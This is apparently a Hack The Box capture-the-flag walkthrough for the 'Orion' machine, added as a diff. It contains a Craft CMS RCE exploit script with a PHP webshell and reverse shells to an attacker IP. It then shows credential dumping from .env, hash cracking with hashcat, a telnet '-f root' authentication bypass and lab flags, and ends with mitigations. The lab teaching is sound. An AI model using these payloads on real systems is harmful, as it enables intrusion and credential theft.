@@ -1,0 +1,301 @@
+═══════════════════════════════════════════════════════════════════════════════
+                    Orion HTB - Complete Walkthrough
+═══════════════════════════════════════════════════════════════════════════════
+
+TABLE OF CONTENTS
+─────────────────
+1. Initial Foothold - Craft CMS RCE (CVE-2025-32432)
+2. Database Credentials Discovery
+3. Password Cracking
+4. User Flag
+5. Privilege Escalation - Telnet CVE-2026-24061
+6. Root Flag
+
+═══════════════════════════════════════════════════════════════════════════════
+1. INITIAL FOOTHOLD - CRAFT CMS RCE (CVE-2025-32432)
+═══════════════════════════════════════════════════════════════════════════════
+
+The target machine orion.htb was running Craft CMS which is vulnerable to
+CVE-2025-32432 - a pre-authentication remote code execution vulnerability.
+
+1.1 Python Exploit Script
+─────────────────────────
+
+The following Python script was used to gain initial access:
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ exploit_craft.py                                                          │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ #!/usr/bin/env python3                                                    │
+│ import requests                                                           │
+│ import re                                                                 │
+│ import sys                                                                │
+│ import time                                                               │
+│                                                                           │
+│ target = "http://orion.htb"                                               │
+│ attacker_ip = "10.10.16.8"  # HTB VPN IP                                 │
+│ attacker_port = 4444                                                      │
+│                                                                           │
+│ session = requests.Session()                                              │
+│                                                                           │
+│ # Step 1: Get CSRF token                                                  │
+│ resp = session.get(f"{target}/admin/login")                               │
+│ csrf_token = re.search(r'name="CRAFT_CSRF_TOKEN" value="([^"]+)"',        │
+│                        resp.text).group(1)                                │
+│ session_id = session.cookies.get('CraftSessionId')                        │
+│                                                                           │
+│ # Step 2: Inject webshell into session                                    │
+│ session.get(f"{target}/index.php?p=admin/dashboard&a=<?=eval($_GET['cmd'])?>") │
+│                                                                           │
+│ # Step 3: Trigger RCE                                                     │
+│ data = {                                                                  │
+│     'assetId': '11',                                                      │
+│     'handle[width]': '123',                                               │
+│     'handle[height]': '123',                                              │
+│     'handle[as][session][__class]': 'GuzzleHttp\\Psr7\\FnStream',         │
+│     'handle[as][session][_fn_close]': 'phpinfo'                           │
+│ }                                                                         │
+│                                                                           │
+│ headers = {                                                               │
+│     'X-CSRF-Token': csrf_token,                                           │
+│     'Cookie': f'CraftSessionId={session_id}',                             │
+│     'Content-Type': 'application/x-www-form-urlencoded'                   │
+│ }                                                                         │
+│                                                                           │
+│ session.post(f"{target}/index.php?p=actions/assets/generatetransform",    │
+│              data=data, headers=headers)                                  │
+│                                                                           │
+│ # Step 4: Get reverse shell                                               │
+│ rev_shell = f'php -r "$sock=fsockopen("{attacker_ip}",{attacker_port});'  │
+│             f'exec("/bin/sh -i <&3 >&3 2>&3");"'                         │
+│ session.get(f"{target}/index.php?p=admin/dashboard&cmd={rev_shell}",      │
+│             headers={'Cookie': f'CraftSessionId={session_id}'})           │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+1.2 Manual RCE Commands
+───────────────────────
+
+After obtaining the session ID and CSRF token, command execution was
+achieved with:
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ # Test command execution                                                  │
+│ curl "http://orion.htb/index.php?p=admin/dashboard&cmd=id" \              │
+│   -H "Cookie: CraftSessionId=fughcgokhgd38hrho906mn53vt"                  │
+│                                                                           │
+│ # Get reverse shell                                                       │
+│ curl "http://orion.htb/index.php?p=admin/dashboard&cmd=bash%20-c%20'exec%20bash%20-i%20%26%3E%20/dev/tcp/10.10.16.8/4444%20%3C%261'" \ │
+│   -H "Cookie: CraftSessionId=fughcgokhgd38hrho906mn53vt"                  │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+═══════════════════════════════════════════════════════════════════════════════
+2. DATABASE CREDENTIALS DISCOVERY
+═══════════════════════════════════════════════════════════════════════════════
+
+With a reverse shell as www-data, we enumerated the Craft CMS installation:
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ www-data@orion:~/html/craft$ ls -la                                        │
+│ total 364                                                                  │
+│ drwxrwxr-x 7 www-data www-data 4096 Mar 6 11:22 .                         │
+│ drwxr-xr-x 3 root root 4096 Mar 6 11:19 ..                                │
+│ -rw-rw-r-- 1 www-data www-data 718 Mar 6 11:24 .env                       │
+│                                                                           │
+│ www-data@orion:~/html/craft$ cat .env                                     │
+│ CRAFT_DB_DRIVER=mysql                                                     │
+│ CRAFT_DB_SERVER=127.0.0.1                                                 │
+│ CRAFT_DB_PORT=3306                                                        │
+│ CRAFT_DB_DATABASE=orion                                                   │
+│ CRAFT_DB_USER=root                                                        │
+│ CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!                                │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+The .env file contained the MySQL database credentials.
+
+2.1 MySQL Enumeration
+─────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ www-data@orion:~/html/craft$ mysql -u root -p orion                       │
+│ Enter password: SuperSecureCraft123Pass!                                  │
+│                                                                           │
+│ MariaDB [orion]> show tables;                                             │
+│ +----------------------------+                                            │
+│ | Tables_in_orion            |                                            │
+│ +----------------------------+                                            │
+│ | addressbook                |                                            │
+│ | assetindexdata             |                                            │
+│ | assets                     |                                            │
+│ | categories                 |                                            │
+│ | categorygroups             |                                            │
+│ | ...                        |                                            │
+│ | users                      |                                            │
+│ | ...                        |                                            │
+│ +----------------------------+                                            │
+│                                                                           │
+│ MariaDB [orion]> select * from users;                                     │
+│ +----+------+--------+----+-----+-----+-----+-----+----------+           │
+│ | id | ... | username| ... | email          | password                   │
+│ +----+------+--------+----+-----+-----+-----+-----+----------+           │
+│ | 1  | ... | admin   | ... | adam@orion.htb | $2y$13$e9zuohgFZz...      │
+│ +----+------+--------+----+-----+-----+-----+-----+----------+           │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+The admin user's password hash was found in the users table:
+$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
+
+═══════════════════════════════════════════════════════════════════════════════
+3. PASSWORD CRACKING
+═══════════════════════════════════════════════════════════════════════════════
+
+The bcrypt hash was cracked using Hashcat with the rockyou wordlist:
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ ┌──(b0y㉿kali)-[~/Documents/HTB/Orion]                                     │
+│ └─$ echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt │
+│                                                                           │
+│ ┌──(b0y㉿kali)-[~/Documents/HTB/Orion]                                     │
+│ └─$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt             │
+│                                                                           │
+│ $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel    │
+│                                                                           │
+│ Session..........: hashcat                                                 │
+│ Status...........: Cracked                                                │
+│ Hash.Target......: $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P... │
+│ Time.Started.....: 2026-07-08 13:45:00                                    │
+│ Time.Estimated...: 2026-07-08 13:45:30                                    │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+Password cracked: darkangel
+
+═══════════════════════════════════════════════════════════════════════════════
+4. USER FLAG
+═══════════════════════════════════════════════════════════════════════════════
+
+SSH login as adam using the cracked password:
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ ┌──(b0y㉿kali)-[~/Documents/HTB/Orion]                                     │
+│ └─$ ssh adam@orion.htb                                                    │
+│ adam@orion.htb's password: darkangel                                      │
+│                                                                           │
+│ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)      │
+│                                                                           │
+│ adam@orion:~$ ls                                                          │
+│ user.txt                                                                  │
+│ adam@orion:~$ cat user.txt                                                │
+│ 91eb0ce69c7e730e367bef04c81b12a1                                          │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+USER FLAG: 91eb0ce69c7e730e367bef04c81b12a1
+
+═══════════════════════════════════════════════════════════════════════════════
+5. PRIVILEGE ESCALATION - TELNET CVE-2026-24061
+═══════════════════════════════════════════════════════════════════════════════
+
+5.1 Service Enumeration
+───────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ adam@orion:~$ netstat -tulnp                                               │
+│ Proto Recv-Q Send-Q Local Address     Foreign Address   PID/Program name   │
+│ tcp    0      0    127.0.0.53:53     0.0.0.0:*         LISTEN -           │
+│ tcp    0      0    0.0.0.0:80        0.0.0.0:*         LISTEN -           │
+│ tcp    0      0    0.0.0.0:22        0.0.0.0:*         LISTEN -           │
+│ tcp    0      0    127.0.0.1:23      0.0.0.0:*         LISTEN -           │
+│ tcp    0      0    127.0.0.1:3306    0.0.0.0:*         LISTEN -           │
+│ tcp6   0      0    :::22             :::*              LISTEN -           │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+Port 23 (telnet) was found listening locally on 127.0.0.1.
+
+5.2 Telnet Version Check
+────────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ adam@orion:~$ telnet --version                                             │
+│ telnet (GNU inetutils) 2.7                                                │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+This version of telnet is vulnerable to CVE-2026-24061 - Remote Authentication
+Bypass. The vulnerability allows authentication bypass by setting the USER
+environment variable with the -f flag.
+
+5.3 Exploitation
+────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ adam@orion:~$ USER="-f root" telnet -a 127.0.0.1                          │
+│ Trying 127.0.0.1...                                                        │
+│ Connected to 127.0.0.1.                                                    │
+│ Escape character is '^]'.                                                  │
+│                                                                           │
+│ Linux 5.15.0-177-generic (orion) (pts/1)                                  │
+│                                                                           │
+│ Welcome to Ubuntu 22.04.5 LTS                                             │
+│                                                                           │
+│ System information as of Wed Jul  8 01:49:50 PM UTC 2026                  │
+│   System load:  0.0               Processes:             220              │
+│   Usage of /:   78.1% of 5.81GB   Users logged in:       0                │
+│   Memory usage: 9%                IPv4 address for eth0: 10.129.109.237   │
+│   Swap usage:   0%                                                        │
+│                                                                           │
+│ root@orion:~#                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+The USER="-f root" environment variable causes telnetd to execute:
+login -f root
+
+The -f flag skips authentication, granting root access without password.
+
+═══════════════════════════════════════════════════════════════════════════════
+6. ROOT FLAG
+═══════════════════════════════════════════════════════════════════════════════
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ root@orion:~# ls                                                           │
+│ root.txt  snap                                                             │
+│ root@orion:~# cat root.txt                                                 │
+│ 1a91c9eb7de0392d8a6d685113fcb245                                           │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+ROOT FLAG: 1a91c9eb7de0392d8a6d685113fcb245
+
+═══════════════════════════════════════════════════════════════════════════════
+SUMMARY
+═══════════════════════════════════════════════════════════════════════════════
+
+Vulnerabilities Exploited:
+─────────────────────────
+1. CVE-2025-32432 - Craft CMS Pre-Auth RCE
+   → Initial access as www-data
+
+2. Weak Configuration / Default Credentials
+   → MySQL password stored in .env file
+
+3. Weak Password
+   → admin password 'darkangel' cracked with hashcat
+
+4. CVE-2026-24061 - GNU Inetutils Telnet Authentication Bypass
+   → Privilege escalation to root
+
+Flags Obtained:
+───────────────
+User Flag:  91eb0ce69c7e730e367bef04c81b12a1
+Root Flag:  1a91c9eb7de0392d8a6d685113fcb245
+
+═══════════════════════════════════════════════════════════════════════════════
+MITIGATION RECOMMENDATIONS
+═══════════════════════════════════════════════════════════════════════════════
+
+1. Update Craft CMS to the latest version to patch CVE-2025-32432
+2. Use strong, unique passwords (avoid common words)
+3. Store database credentials securely (outside web root)
+4. Disable insecure services like telnet
+5. Use SSH with key-based authentication only
+6. Implement proper logging and monitoring
+7. Regular security audits and penetration testing
+
+═══════════════════════════════════════════════════════════════════════════════
+END OF WRITE-UP
+═══════════════════════════════════════════════════════════════════════════════
